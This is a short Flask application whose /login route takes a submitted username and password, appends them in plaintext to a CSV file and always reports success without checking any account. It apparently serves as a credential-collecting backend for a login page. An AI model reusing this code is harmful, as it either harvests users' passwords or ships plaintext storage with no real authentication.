from flask import Flask,redirect,url_for,request,render_template,jsonify
import csv

app=Flask(__name__)

@app.route("/")
def index():
    return render_template("/login.html")

@app.route("/login",methods=["POST"])
def login():
    userName=request.json.get("username")
    Password=request.json.get("password")
    with open("credts.csv","a+") as x:
        data=csv.writer(x)
        data.writerow([userName,Password])
        return jsonify({
            "status":"success"
        })
app.run()